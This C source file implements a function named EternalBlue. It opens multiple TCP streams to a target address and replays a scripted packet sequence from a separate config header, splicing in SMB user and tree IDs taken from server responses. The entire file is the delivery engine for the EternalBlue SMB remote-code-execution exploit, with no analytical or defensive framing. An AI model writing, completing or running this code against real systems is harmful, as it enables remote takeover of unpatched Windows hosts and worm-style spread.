#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "config.h"

int EternalBlue(const char *ip, int port)
{
    SOCKET sockets[NUM_SOCKETS + 1];
    uint8_t userid[2] = {0, 0};
    uint8_t treeid[2] = {0, 0};
    WSADATA wsa_data;
    struct sockaddr_in address;
    size_t packet_size = sizeof(EB_PACKETS);
    size_t i;
    int wsa_started = 0;
    int result = -1;

    for (i = 0; i <= NUM_SOCKETS; ++i) {
        sockets[i] = INVALID_SOCKET;
    }

    if (ip == NULL || port < 1 || port > 65535) {
        printf("EternalBlue: invalid address or port\n");
        goto cleanup;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        printf("EternalBlue: WSAStartup failed\n");
        goto cleanup;
    }
    wsa_started = 1;

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1) {
        printf("EternalBlue: invalid IPv4 address\n");
        goto cleanup;
    }

    for (i = 0; i < (size_t)EB_OPS_COUNT; ++i) {
        const eb_op_t *op = &EB_OPS[i];
        int stream = op->stream;

        if (stream < 1 || stream > NUM_SOCKETS) {
            printf("EternalBlue: invalid stream at operation %zu\n", i);
            goto cleanup;
        }

        if (op->kind == 0) {
            SOCKET sock;

            printf("EternalBlue: operation %zu connect stream %d\n", i, stream);
            if (sockets[stream] != INVALID_SOCKET) {
                printf("EternalBlue: stream %d is already connected\n", stream);
                goto cleanup;
            }

            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                printf("EternalBlue: socket creation failed\n");
                goto cleanup;
            }
            sockets[stream] = sock;

            if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR) {
                printf("EternalBlue: connect failed on stream %d\n", stream);
                goto cleanup;
            }
        } else if (op->kind == 1) {
            size_t offset = (size_t)op->offset;
            size_t length = (size_t)op->length;
            size_t pos = 0;
            size_t out_length = 0;
            uint8_t *buffer;
            static const char userid_placeholder[] = "__USERID__PLACEHOLDER__";
            static const char treeid_placeholder[] = "__TREEID__PLACEHOLDER__";
            const size_t userid_placeholder_length = sizeof(userid_placeholder) - 1;
            const size_t treeid_placeholder_length = sizeof(treeid_placeholder) - 1;

            printf("EternalBlue: operation %zu send stream %d\n", i, stream);
            if (sockets[stream] == INVALID_SOCKET ||
                offset > packet_size || length > packet_size - offset) {
                printf("EternalBlue: invalid send operation %zu\n", i);
                goto cleanup;
            }

            buffer = (uint8_t *)malloc(length == 0 ? 1 : length);
            if (buffer == NULL) {
                printf("EternalBlue: send buffer allocation failed\n");
                goto cleanup;
            }

            while (pos < length) {
                size_t remaining = length - pos;

                if (remaining >= userid_placeholder_length &&
                    memcmp(EB_PACKETS + offset + pos, userid_placeholder,
                           userid_placeholder_length) == 0) {
                    memcpy(buffer + out_length, userid, sizeof(userid));
                    pos += userid_placeholder_length;
                    out_length += sizeof(userid);
                } else if (remaining >= treeid_placeholder_length &&
                           memcmp(EB_PACKETS + offset + pos, treeid_placeholder,
                                  treeid_placeholder_length) == 0) {
                    memcpy(buffer + out_length, treeid, sizeof(treeid));
                    pos += treeid_placeholder_length;
                    out_length += sizeof(treeid);
                } else {
                    buffer[out_length++] = EB_PACKETS[offset + pos++];
                }
            }

            pos = 0;
            while (pos < out_length) {
                size_t remaining = out_length - pos;
                int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
                int sent = send(sockets[stream], (const char *)buffer + pos, chunk, 0);

                if (sent == SOCKET_ERROR || sent == 0) {
                    printf("EternalBlue: send failed on stream %d\n", stream);
                    free(buffer);
                    goto cleanup;
                }
                pos += (size_t)sent;
            }

            free(buffer);
        } else if (op->kind == 2) {
            uint8_t response[4096];
            int received;

            printf("EternalBlue: operation %zu receive stream %d\n", i, stream);
            if (sockets[stream] == INVALID_SOCKET) {
                printf("EternalBlue: invalid receive stream %d\n", stream);
                goto cleanup;
            }

            received = recv(sockets[stream], (char *)response, (int)sizeof(response), 0);
            if (received == SOCKET_ERROR || received == 0) {
                printf("EternalBlue: receive failed or peer closed stream %d\n", stream);
                goto cleanup;
            }

            if (op->fix == 1 && received >= 34) {
                userid[0] = response[32];
                userid[1] = response[33];
            } else if (op->fix == 2 && received >= 30) {
                treeid[0] = response[28];
                treeid[1] = response[29];
            }
        } else if (op->kind == 3) {
            printf("EternalBlue: operation %zu close stream %d\n", i, stream);
            if (sockets[stream] == INVALID_SOCKET) {
                printf("EternalBlue: stream %d is not open\n", stream);
                goto cleanup;
            }
            if (closesocket(sockets[stream]) == SOCKET_ERROR) {
                printf("EternalBlue: close failed on stream %d\n", stream);
                goto cleanup;
            }
            sockets[stream] = INVALID_SOCKET;
        } else {
            printf("EternalBlue: invalid operation kind at operation %zu\n", i);
            goto cleanup;
        }
    }

    result = 0;

cleanup:
    for (i = 1; i <= NUM_SOCKETS; ++i) {
        if (sockets[i] != INVALID_SOCKET) {
            if (closesocket(sockets[i]) == SOCKET_ERROR) {
                printf("EternalBlue: cleanup close failed on stream %zu\n", i);
                result = -1;
            }
            sockets[i] = INVALID_SOCKET;
        }
    }
    if (wsa_started) {
        WSACleanup();
    }
    return result;
}